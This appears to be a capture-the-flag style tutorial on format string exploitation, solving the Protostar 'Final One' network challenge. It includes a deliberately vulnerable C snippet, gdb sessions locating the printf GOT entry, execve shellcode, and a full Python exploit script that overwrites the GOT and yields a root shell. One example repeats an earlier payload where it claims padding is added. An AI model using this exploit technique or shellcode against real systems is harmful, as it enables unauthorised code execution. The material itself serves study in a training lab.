---
title: Binary Exploitation - Protostar - Format String
date: 2020-01-03 20:07:49
tags: Security
---

# Introduction
For this section, we'll be looking into the exploits that are associated with format string vulnerabilities. 

We will be using [Final One](https://exploit.education/protostar/final-one/) from the Protostar Exploit Exercises on the Protostar VM. This VM gives us an environment where modern security features, such as ASLR are not enabled.

The last caveat is that this exploit will be done "over the network", as the binary that we will be exploiting is a "web server" that accepts TCP connections that emulates an authentication server.

# Vulnerability
The vulnerability is when raw user input is passed into `printf()` from the stack, then we can arbitrarily write to an arbitrary address using `%x$n`, which will write to the `xth` variable.

The `%n` flag will write the number of characters printed so far. 

The exploit can be demonstrated using this small snippet.

```c
#include <stdio.h>

int zero = 0;

int main() {
	char text[124];
	fgets(text, 124, stdin);
	printf(text);
	printf("%d\n", zero);
}
```

The first interesting thing we can do is shown below.
```bash
python -c "print 'AAAA' + ' %x' * 20" | ./format-str-vuln    
```
We get output:
```bash
AAAA 7c b7fd8420 bffff6f4 b7fec242 41414141 20782520 25207825 78252078 20782520 25207825 78252078 2078252 0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```
You should know that passing `%x` into `printf()` will cause it to print out the nth parameter in hex form.

What we can see here, is that even through we don't pass any extra parameters to `printf(text)` , `printf()` still attempts print out the parameters. Furthermore, we can even see that we our `AAAA`'s in the memory that is printed. This is because, `fgets()` writes to `text` which is on the stack of `main()`. Thus, when `printf()`  attempts to print the subsequent arguments, it will go through the stack and eventually reach the stack for `main()` and subsequently the string that we provided. 

This means that using the numbered argument syntax, we can write to an address that we pass in. We can see that the `AAAA`'s were the 5th argument and so we'll replace them with the intended address to write to (in this case it is the address of the `zero` variable which is `0x08049660`. Then use `%5$n` to write to that address.

```bash
 python -c "print '\x60\x96\x04\x08' + '%5\$n'" | ./format-str-vuln 
 ```

We can see that we've successfully written `4` to the `zero` variable.  Which is the number of character that we've written thus far (the size of the address for `zero`).

A trick to write an arbitrary value is to use the padding function that `printf()` also comes with, e.g. `%1000x` will pad 1000 characters.


Thus if we use the following input:
```bash
 python -c "print '\x60\x96\x04\x08' + '%5\$n'" | ./format-str-vuln 
 ```
 We can see that we've set `zero` to 1000. 

Finally, we can use this arbitrary write to overwrite the entry in the global offset table to redirect code execution.

# Challenge
Let's take a look at the [Final One](https://exploit.education/protostar/final-one/) challenge.
```c
```c
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();

}
```
We can see that the program expects the user to provide a username through `username user` and then attempt to login with `login password`, if the user has not been selected before logging in, then a `login failed` message will be sent. We can play around with this program using `netcat`. The program is running by default on the Protostar VM and thus we can be connect to it using the following command:
```bash
nc 127.0.0.1 2994
```
Then we can play around with the program:
```bash
[final1] $ login pw      
invalid protocol
[final1] $ username user   
[final1] $ login pw
login failed 
```
The exploit in this program can be found in the `syslog` function. Using `man syslog` can be observe that `syslog` is actually just a call to `printf()` that is directed to the kernel log or `/var/log/syslog`.

We can check this by attempting to login with the password `%x %x %x %x %x` and checking `/var/log/syslog` (you'll have to be root to check the `syslog`).
```bash
Jan  3 04:09:44 (none) final1: Login from 127.0.0.1:50673 as [user] with password [8049ee4 804a2a0 804a220 bffffbd6 b7fd7ff4]
````

The approach for this challenge will be to place shell code in `username` and then redirect code execution by overwriting the GOT entry for `printf()`, then means that after `logit()` finishes executing, the subsequent call to `print()` should give us root access of to the program.

To find the GOT entry for `printf()` we open the `final1` in `gdb` and then we can use `print printf` to find the PLT entry, and then follow that code to find the GOT entry.
```
(gdb) print printf
$1 = {<text variable, no debug info>} 0x8048ccc <printf@plt>
(gdb) disassemble 0x8048ccc
Dump of assembler code for function printf@plt:
0x08048ccc <printf@plt+0>:	jmp    *0x804a174
0x08048cd2 <printf@plt+6>:	push   $0xf8
0x08048cd7 <printf@plt+11>:	jmp    0x8048acc
End of assembler dump.
(gdb) x/x 0x804a174
0x804a174 <_GLOBAL_OFFSET_TABLE_+136>:	0x08048cd2
```
So, the address of `printf` is `0x08048cd2`.

Next, we'll need to find the address for username, then can be done simply with:
```bash
(gdb) print &username
$2 = (char (*)[128]) 0x804a220
```
Or, alternatively we can see that `username` is used in `strcpy()`  in `parser()` and from the disassembly of `parser()` we can find the address for username.
```bash
0x08049995 <parser+88>:	movl   $0x804a220,(%esp)
0x0804999c <parser+95>:	call   0x8048cbc <strcpy@plt>
```
So, the address of `username` is `0x804a220`.

We'll also use some shell code from the internet `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00` (if this is executed, it should give us root).

The next step is to find a way to inject these addresses into the "arguments" of the `printf` in `syslog`. We can set up a small script to connect to the server and interact with it.
```python
import socket
import struct

def waitForLine(s):
        while (True):
                c = s.recv(1)
                if (c == '$'):
                        return;

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1",2994))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"

username = 0x804a220
got = 0x804a174
waitForLine(sock)
sock.send("username " + shellcode + "\n")
waitForLine(sock)
sock.send("login " + "AAAAA" + " %x" * 30  + "\n")
```

The `waitForLine()` function is a small helper that will cause the application to hang if nothing is received from the user, also accounting for the `[final1] $ ` that heads every message.  We connect to the server using a socket and then will send the shell code with the username and then a password of `[%x]`'s headed by `AAAAA`, then will let us attempt to find the `A`'s in the `syslog` to find out which argument the `A`'s are on the stack.
```bash
Jan  3 04:25:02 (none) final1: Login from 127.0.0.1:50674 as [1�Ph//shh/bin��PS���#013̀] with password [AAAAA 8049ee4 804a2a0 804a220 bffffbd6 b7fd7ff4 bffffa28 69676f4c 7266206e 31206d6f 302e3732 312e302e 3630353a 61203437 315b2073 2f6850c0 6868732f 6e69622f 5350e389 bb0e189 205d80cd 68746977 73617020 726f7773 415b2064 41414141 20782520 25207825 78252078 20782520 25207825]
```
We can see that `A`'s start in the last byte of the 24th argument and take up the whole 25th argument. Then means that we can modify the GOT entry by changing the code as follows:
```python
sock.send("login " + "A" + struct.pack("I", got) + struct.pack("I", got + 2) + "%1000x" + "%25$n"  + "%1000x" + "%26$n" +  "\n")
```
We can use `struct.pack` to help us reverse the bytes in the GOT address without us having to do it manually.  Another interesting point is that there are two `struct.pack()` calls, one for `got` and one for `got + 2`, this is because we will write the lower 4 bytes of the GOT first and then write to upper 4 bytes of the GOT to save time. The value that we are writing to write to the GOT entry is `0x804a220` or `134521376`, it takes a bit of time for `printf()` to process this much padding and thus we can save some time by simply writing twice instead. It should also be noted that the lower bytes need to be written first, since it writing to the lower bytes will also overwrite the upper bytes.

We know that the addresses that we've put into the message are the 25th and 26th argument on the stack and thus we can use the "%x$n" syntax to write to them.

Now to calculate the padding,  the easiest to do this is to simply attach a debugger to `final1` using `ps -aux | grep final1`  to find the `pid` of `final1`, attaching `gdb` to `final1`. We can then set `set follow-fork-mode child`, which will let `gdb` follow the forking that is done by the binary. We can then set a break point after `logit()`, then we can use `x/x 0x804a174` to see what the value is and then increase or decrease the padding accordingly.

However, slightly more methodical way to do this would be to calculate by hand the amount of padding that is required. Let's take a look at the string that is passed to `syslog`.
```c
snprintf(buf,  sizeof(buf),  "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
```

We are really only interested in the amount of characters before the start of password. This can be calculated using the following formula:
`l = len("Login from  as [] with password [") + len(hostname) + len(username) + 9`

The 9 comes from the `A` followed by two addresses which accounts for 9 bytes at the beginning of our 'password'.  The `hostname` can be retrieved by using `sock.getpeername()[0] + ":" + str(sock.getpeername()[1])`. 

Now to calculate the size of the padding we'll need to get to `0xa220`, we essentially just do `0xa220 - l`, or `(username & 0x000ffff) - l`.

For the second padding, it is given by `0x10804 - firstpad - l`. We need to use `0x10804` rather than `0x804` since, we cannot unwrite characters to decrease the value that "%n" will write, and thus we must use the overflown value. Instead of `0x10804`, we can also use `((username >>  16)  |  0x10000)` to the same effect.

Putting it all together:
```python
import socket
import struct
import telnetlib

def waitForLine(s):
        while (True):
                c = s.recv(1)
                if (c == '$'):
                        return;

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1",2994))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"

name =  sock.getpeername()

l = len(shellcode) +  len("Login from  as [] with password [") + len(name[0] + ":" + str(name[1])) + 9
username = 0x804a220
got = 0x804a174

firstpad = (username & 0x000ffff) - l
secondpad = ((username >> 16) | 0x10000) - firstpad - l


waitForLine(sock)
sock.send("username " + shellcode + "\n")
waitForLine(sock)
sock.send("login " + "A"  + struct.pack("I", got) + struct.pack("I", got + 2) + "%" + str(firstpad) + "x" + "%25$n"  + "%" + str(secondpad) + "x" + "%26$n" +  "\n")

tn = telnetlib.Telnet()
tn.sock = sock
tn.interact()
```

Finally, we can use `telnetlib` to interact with the shell that we've created:
```bash
user@protostar:/tmp$ python final1-a.py 
 login failed
whoami
root
```